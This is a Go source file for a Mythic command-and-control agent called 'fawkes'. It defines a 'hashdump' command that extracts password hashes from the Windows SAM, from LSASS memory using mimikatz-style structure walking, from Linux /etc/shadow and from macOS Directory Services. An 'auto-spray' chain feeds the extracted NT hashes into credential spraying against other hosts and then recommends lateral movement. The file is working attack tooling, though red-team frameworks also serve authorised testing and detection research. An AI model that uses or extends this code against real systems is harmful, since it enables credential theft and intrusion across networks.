package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "hashdump",
		Description:         "Extract local account password hashes. Windows: NTLM hashes from SAM registry (requires SYSTEM), live logon session enumeration via LSA APIs (insitu, requires admin), or in-situ LSASS memory walk that pattern-scans lsasrv.dll for LogonSessionList, traverses the linked list, overlays the KIWI_MSV1_0_LIST_63 layout on each node to extract LUID/UserName/Domain/AuthPackage/LogonType/Credentials-pointer, then walks the per-AuthPackage credential chain at credentials_ptr to capture each KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope (UserName, Domain, encrypted ciphertext bytes — decryption is Phase 2C-ii-b) (insitu-full, requires admin + PROCESS_VM_READ). Linux: hashes from /etc/shadow (requires root). macOS: hashes from Directory Services (requires root). Use 'auto-spray' action to dump hashes and automatically spray them against discovered hosts via cred-check.",
		HelpString:          "hashdump [-format json]\nhashdump -action insitu\nhashdump -action insitu-full\nhashdump -action auto-spray [-targets 192.168.1.0/24,10.0.0.5]",
		Version:             4,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1003.002", "T1003.008"}, // SAM + /etc/passwd + macOS DS
		SupportedUIFeatures: []string{},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "hashdump_new.js"),
			Author:     "@galoryber",
		},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS:                []string{agentstructs.SUPPORTED_OS_WINDOWS, agentstructs.SUPPORTED_OS_LINUX, agentstructs.SUPPORTED_OS_MACOS},
			CommandCanOnlyBeLoadedLater: true,
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"hashdumpDumpDone":       hashdumpDumpDone,
			"hashdumpSprayGroupDone": hashdumpSprayGroupDone,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				CLIName:          "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"dump", "insitu", "insitu-full", "auto-spray"},
				Description:      "dump: extract local hashes from SAM (requires SYSTEM, Windows only). insitu: enumerate active logon sessions via LSA APIs in-process (requires admin, Windows only). insitu-full: open lsass.exe with PROCESS_VM_READ, sigscan lsasrv.dll for LogonSessionList, walk the linked list, parse each node's KIWI_MSV1_0_LIST_63 fields (LUID, UserName, Domain, AuthPackage, LogonType, Credentials-pointer), then walk the credentials_ptr chain to capture each KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope (encrypted ciphertext is reported opaquely — Phase 2C-ii-b will decrypt) — Win10 21H2 / Win11 23H2 layout (requires admin, Windows only). auto-spray: dump hashes then spray them against target hosts via cred-check.",
				DefaultValue:     "dump",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:                 "targets",
				CLIName:              "targets",
				ModalDisplayName:     "Spray Targets",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:          "Target hosts for auto-spray (IPs, comma-separated, or CIDR). If empty, uses active callback hosts.",
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:          "format",
				CLIName:       "format",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:   "Output format (Linux/macOS only)",
				DefaultValue:  "text",
				Choices:       []string{"text", "json"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			if action == "insitu" {
				msg = "OPSEC WARNING: hashdump -action insitu calls LsaEnumerateLogonSessions/LsaGetLogonSessionData in-process. No remote handle to lsass.exe is opened (Phase 1 — LSA API only). Requires administrator privileges for full visibility across all sessions."
			} else if action == "insitu-full" {
				msg = "OPSEC WARNING: hashdump -action insitu-full opens lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION and calls ReadProcessMemory across the lsasrv.dll image, every walked LogonSessionList node, every LSA_UNICODE_STRING.Buffer dereference for username/domain/auth-package strings, and (Phase 2C-ii-a) every KIWI_MSV1_0_CREDENTIAL_LIST entry + KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope reachable from credentials_ptr. The encrypted credential blobs are captured raw and reported as hex previews — no decryption keys are loaded yet (Phase 2C-ii-b). Process handle to LSASS is the highest-fidelity EDR signal available — equivalent to mimikatz/dumpit on most modern EDR. Requires administrator privileges (and SYSTEM if Credential Guard or LSA Protection is enabled). Signature + KIWI_MSV1_0_LIST_63 + CREDENTIAL_LIST layouts calibrated for Win10 21H2 — Win11 23H2; older builds may emit 'signature not found' or report walked nodes with empty parsed_username/parsed_domain (layout drift)."
			} else {
				msg = "OPSEC WARNING: hashdump reads SAM registry hive (Windows) or /etc/shadow (Linux). "
				switch taskData.Payload.OS {
				case "Windows":
					msg += "Requires SYSTEM privileges. Accesses HKLM\\SAM and HKLM\\SYSTEM — may trigger EDR alerts for sensitive registry access."
				case "Linux":
					msg += "Requires root. Reads /etc/shadow — may be audited by auditd/SELinux."
				default:
					msg += "Requires root. Reads local credential stores — may trigger endpoint detection."
				}
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Hashdump credential extraction configured. SAM/shadow access will occur on execution.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			for _, line := range strings.Split(responseText, "\n") {
				line = strings.TrimSpace(line)
				if line == "" {
					continue
				}
				// Format: username:rid:lm_hash:nt_hash:::
				parts := strings.SplitN(line, ":", 8)
				if len(parts) < 4 {
					continue
				}
				username := parts[0]
				if username == "" {
					continue
				}
				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
					CredentialType: "hash",
					Realm:          hostname,
					Account:        username,
					Credential:     strings.TrimRight(line, "\n"),
					Comment:        "hashdump (SAM)",
				})
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] hashdump extracted %d SAM hashes from %s", len(creds), hostname), true)
			}
			return response
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			if action == "auto-spray" {
				return hashdumpAutoSpray(taskData)
			}

			if action == "insitu" {
				display := "LSASS in-situ session enumeration (LSA API, in-process)"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "API Call",
					ArtifactMessage:  "LsaEnumerateLogonSessions + LsaGetLogonSessionData (active logon session metadata from live LSASS)",
				})
				return response
			}

			if action == "insitu-full" {
				display := "LSASS in-situ memory walk (sigscan + LogonSessionList traversal + KIWI_MSV1_0_LIST_63 field parse + KIWI_MSV1_0_CREDENTIAL_LIST envelope walk)"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "API Call",
					ArtifactMessage:  "OpenProcess(lsass.exe, PROCESS_VM_READ|PROCESS_QUERY_LIMITED_INFORMATION) + ReadProcessMemory across lsasrv.dll image + every walked LogonSessionList node + every LSA_UNICODE_STRING.Buffer dereference for username/domain/auth-package strings + every KIWI_MSV1_0_CREDENTIAL_LIST entry and KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope reachable from credentials_ptr (mimikatz signature_x64_w8 + KIWI_MSV1_0_LIST_63 + CREDENTIAL_LIST layouts; ciphertext captured opaquely, decryption deferred to Phase 2C-ii-b)",
				})
				return response
			}

			switch taskData.Payload.OS {
			case "Linux":
				display := "/etc/shadow dump"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "FileOpen",
					ArtifactMessage:  "Read /etc/shadow + /etc/passwd (hash extraction)",
				})
			case "macOS":
				display := "Directory Services dump"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "FileOpen",
					ArtifactMessage:  "Read /var/db/dslocal/nodes/Default/users/*.plist (PBKDF2 hash extraction)",
				})
			default:
				display := "SAM Dump"
				response.DisplayParams = &display
				mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           taskData.Task.ID,
					BaseArtifactType: "API Call",
					ArtifactMessage:  "RegOpenKeyExW + RegQueryValueExW on SAM\\SAM\\Domains\\Account (NTLM hash extraction)",
				})
			}
			return response
		},
	})
}

// --- Hashdump auto-spray subtask chain ---

// hashdumpAutoSpray creates a hashdump subtask, then chains to credential spraying.
func hashdumpAutoSpray(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
	response := agentstructs.PTTaskCreateTaskingMessageResponse{
		Success: true,
		TaskID:  taskData.Task.ID,
	}

	targets, _ := taskData.Args.GetStringArg("targets")

	// Store chain context (targets) in Stdout for completion functions
	ctx := map[string]string{}
	if targets != "" {
		ctx["targets"] = targets
	}
	ctxJSON, _ := json.Marshal(ctx)
	stdout := string(ctxJSON)
	response.Stdout = &stdout

	// Create hashdump subtask (default dump action)
	callbackFunc := "hashdumpDumpDone"
	if _, err := mythicrpc.SendMythicRPCTaskCreateSubtask(mythicrpc.MythicRPCTaskCreateSubtaskMessage{
		TaskID:                  taskData.Task.ID,
		SubtaskCallbackFunction: &callbackFunc,
		CommandName:             "hashdump",
		Params:                  `{"action":"dump"}`,
	}); err != nil {
		response.Success = false
		response.Error = fmt.Sprintf("Failed to create hashdump subtask: %v", err)
		return response
	}

	display := "Auto-Spray: hashdump → cred-check"
	if targets != "" {
		display += fmt.Sprintf(" (targets: %s)", targets)
	} else {
		display += " (targets: active callback hosts)"
	}
	response.DisplayParams = &display

	createArtifact(taskData.Task.ID, "Subtask Chain",
		"Auto-spray chain: hashdump → parse hashes → cred-check spray")

	return response
}

// hashdumpDumpDone handles hashdump completion → parses hashes → creates cred-check spray group.
func hashdumpDumpDone(
	taskData *agentstructs.PTTaskMessageAllData,
	subtaskData *agentstructs.PTTaskMessageAllData,
	_ *agentstructs.SubtaskGroupName,
) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if subtaskData.Task.Status == "error" || responseText == "" {
		completed := true
		response.Completed = &completed
		msg := "auto-spray: hashdump failed or returned no output"
		response.Stderr = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskData.Task.ID,
			Response: []byte("[auto-spray] Hashdump failed — no hashes to spray."),
		})
		return response
	}

	// Parse hashes from hashdump output (format: username:rid:lm:nt:::)
	type hashEntry struct {
		username string
		hash     string // NT hash
	}
	var entries []hashEntry
	seen := make(map[string]bool)
	for _, line := range strings.Split(responseText, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 8)
		if len(parts) < 4 {
			continue
		}
		username := parts[0]
		ntHash := parts[3]
		if username == "" || ntHash == "" {
			continue
		}
		// Skip machine accounts and known empty/disabled hashes
		if strings.HasSuffix(username, "$") {
			continue
		}
		if isAllZeros(ntHash) {
			continue
		}
		key := username + "|" + ntHash
		if seen[key] {
			continue
		}
		seen[key] = true
		entries = append(entries, hashEntry{username: username, hash: ntHash})
	}

	if len(entries) == 0 {
		completed := true
		response.Completed = &completed
		msg := "auto-spray: no sprayable hashes found (all empty or machine accounts)"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID:   taskData.Task.ID,
			Response: []byte(fmt.Sprintf("[auto-spray] Hashdump returned %d lines but no sprayable hashes.", strings.Count(responseText, "\n")+1)),
		})
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[auto-spray] Hashdump complete: %d sprayable hashes extracted. Starting credential spray...", len(entries))),
	})

	// Determine target hosts
	chainCtx := extractChainContext(taskData.Task.Stdout)
	hostList := chainCtx["targets"]

	if hostList == "" {
		// Fall back to active callback hosts
		cbResp, err := mythicrpc.SendMythicRPCCallbackSearch(mythicrpc.MythicRPCCallbackSearchMessage{
			AgentCallbackID: taskData.Callback.AgentCallbackID,
		})
		if err != nil || !cbResp.Success {
			completed := true
			response.Completed = &completed
			msg := "auto-spray: failed to query active callbacks for host list"
			response.Stderr = &msg
			return response
		}
		seenHosts := make(map[string]bool)
		var hosts []string
		for _, cb := range cbResp.Results {
			if !cb.Active || cb.Ip == "" {
				continue
			}
			if !seenHosts[cb.Ip] {
				seenHosts[cb.Ip] = true
				hosts = append(hosts, cb.Ip)
			}
		}
		if len(hosts) == 0 {
			completed := true
			response.Completed = &completed
			msg := "auto-spray: no target hosts found (no active callbacks and no targets specified)"
			response.Stderr = &msg
			return response
		}
		hostList = strings.Join(hosts, ",")
	}

	// Cap credentials at 10 to avoid excessive spray traffic
	if len(entries) > 10 {
		entries = entries[:10]
	}

	// Create parallel cred-check subtask group
	var tasks []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks
	for _, e := range entries {
		params := map[string]interface{}{
			"action":   "check",
			"hosts":    hostList,
			"username": e.username,
			"hash":     e.hash,
			"timeout":  5,
		}
		paramsJSON, _ := json.Marshal(params)
		tasks = append(tasks, mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
			CommandName: "cred-check",
			Params:      string(paramsJSON),
		})
	}

	completionFunc := "hashdumpSprayGroupDone"
	groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
		mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
			TaskID:                taskData.Task.ID,
			GroupName:             "hashdump_spray",
			GroupCallbackFunction: &completionFunc,
			Tasks:                 tasks,
		},
	)
	if err != nil || !groupResult.Success {
		completed := true
		response.Completed = &completed
		errMsg := fmt.Sprintf("auto-spray: failed to create cred-check subtask group: %v", err)
		response.Stderr = &errMsg
		return response
	}

	return response
}

// hashdumpSprayGroupDone aggregates results from the parallel cred-check spray.
func hashdumpSprayGroupDone(
	taskData *agentstructs.PTTaskMessageAllData,
	subtaskData *agentstructs.PTTaskMessageAllData,
	_ *agentstructs.SubtaskGroupName,
) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})

	summary := "=== Auto-Spray Results ===\n"
	validCount := 0
	failedCount := 0
	errorCount := 0

	if err == nil && searchResult.Success {
		for _, task := range searchResult.Tasks {
			if task.CommandName != "cred-check" {
				continue // Skip the hashdump subtask
			}
			output := getSubtaskResponses(task.ID)
			successes := strings.Count(output, "SUCCESS")
			failures := strings.Count(output, "FAILED")

			status := "?"
			if task.Status == "error" {
				status = "ERROR"
				errorCount++
			} else if successes > 0 {
				status = fmt.Sprintf("VALID (%d)", successes)
				validCount++
			} else {
				status = fmt.Sprintf("INVALID (%d failed)", failures)
				failedCount++
			}
			summary += fmt.Sprintf("  [%s] %s\n", status, task.DisplayParams)
		}
	}

	summary += fmt.Sprintf("\nSpray results: %d valid, %d invalid, %d errors\n", validCount, failedCount, errorCount)
	if validCount > 0 {
		summary += "⚠ Valid credentials found — consider lateral movement.\n"
	}

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(summary),
	})

	logOperationEvent(taskData.Task.ID,
		fmt.Sprintf("[CREDENTIAL] Auto-spray complete on %s: %d valid, %d invalid, %d errors",
			taskData.Callback.Host, validCount, failedCount, errorCount), validCount > 0)

	return response
}

// parseHashdumpEntries extracts username:hash pairs from hashdump output text.
// Parses lines in "username:rid:lm_hash:nt_hash:::" format, skips machine
// accounts (ending in $) and empty/zero hashes.
func parseHashdumpEntries(text string) []hashdumpEntry {
	var entries []hashdumpEntry
	seen := make(map[string]bool)
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, ":", 8)
		if len(parts) < 4 {
			continue
		}
		username := parts[0]
		ntHash := parts[3]
		if username == "" || ntHash == "" || strings.HasSuffix(username, "$") || isAllZeros(ntHash) {
			continue
		}
		key := username + "|" + ntHash
		if seen[key] {
			continue
		}
		seen[key] = true
		entries = append(entries, hashdumpEntry{Username: username, Hash: ntHash})
	}
	return entries
}

// hashdumpEntry represents a username:hash pair from hashdump output.
type hashdumpEntry struct {
	Username string
	Hash     string
}
